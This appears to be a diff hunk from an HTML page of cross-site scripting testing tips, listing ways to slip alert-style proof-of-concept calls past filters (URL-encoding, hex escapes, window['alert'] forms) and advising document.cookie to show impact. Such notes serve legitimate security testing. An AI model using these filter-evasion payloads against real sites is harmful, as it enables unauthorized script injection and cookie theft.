@@ -15,7 +15,7 @@ Never submit a vulnerability with alert(1) show impact, use document.cookie and 
 <h2>Alert POC Alternatives</h2>
 If alert is blocked or filtered, first try confirm(1), print() or prompt(1).<br>
 Try URL Encoding the A on alert - %61lert(1). URL each char if this does not work using referemce - https://www.w3schools.com/tags/ref_urlencode.ASP <br>
-Try [%27al\x65rt%27](document.domain);// <br>
+[%27al\x65rt%27](document.domain);// <br>
 window['alert'](0)  <br>
 parent['alert'](1)  <br>
 self['alert'](2)  <br>
